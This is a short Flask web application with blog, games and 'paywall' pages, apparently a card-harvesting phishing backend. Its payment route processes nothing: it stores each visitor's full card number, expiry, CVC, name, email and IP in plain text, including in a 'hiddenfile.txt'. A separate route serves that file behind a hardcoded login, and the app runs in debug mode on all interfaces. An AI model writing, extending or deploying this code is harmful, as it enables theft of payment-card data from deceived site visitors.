from flask import Flask, render_template, request, redirect, url_for, send_from_directory, abort, render_template_string
import os
import socket
from requests import get 

app = Flask(__name__)

# Set your password and username
USERNAME = '698445212547825547'
PASSWORD = 'bevendroxmasc888'

def get_client_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0]
    else:
        return request.remote_addr

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/blog')
def blog():
    return render_template('blog.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/games')
def games():
    return render_template('games.html')

@app.route('/review')
def review():
    return render_template('review.html')

@app.route('/paywall')
def paywall():
    return render_template('paywall.html')

@app.route('/thank_you')
def thank_you():
    return render_template('thank_you.html')

@app.route('/submit_payment', methods=['POST'])
def submit_payment():
    email = request.form.get('email')
    name = request.form.get('name')
    card_number = request.form.get('card-number')
    expiry = request.form.get('expiry')  # MM/YY format
    cvc = request.form.get('cvc')
    user_ip = get_client_ip()  # Get the user's IP

    # Save the payment information to payment_info.txt
    with open('payment_info.txt', 'a') as f:
        f.write(f"Email: {email}, Name: {name}, Card Number: {card_number}, Expiry: {expiry}, CVC: {cvc}, User IP: {user_ip}\n")

    # Save to hiddenfile.txt
    with open('hiddenfile.txt', 'a') as f:
        f.write(f"Email: {email}, Name: {name}, Card Number: {card_number}, Expiry: {expiry}, CVC: {cvc}, User IP: {user_ip}\n")

    return redirect(url_for('thank_you'))  # Redirect to the thank you page



@app.route('/hiddenfile.txt', methods=['GET', 'POST'])
def hidden_file():
    if request.method == 'POST':
        # Check if the username and password are correct
        username = request.form.get('username')
        password = request.form.get('password')

        if username == USERNAME and password == PASSWORD:
            return send_from_directory(os.getcwd(), 'hiddenfile.txt')
        else:
            return render_template_string('''
                <h1>Access Denied</h1>
                <p>Invalid username or password.</p>
                <a href="/hiddenfile.txt">Back</a>
            ''')

    # Display the login form
    return '''
        <form method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Login</button>
        </form>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
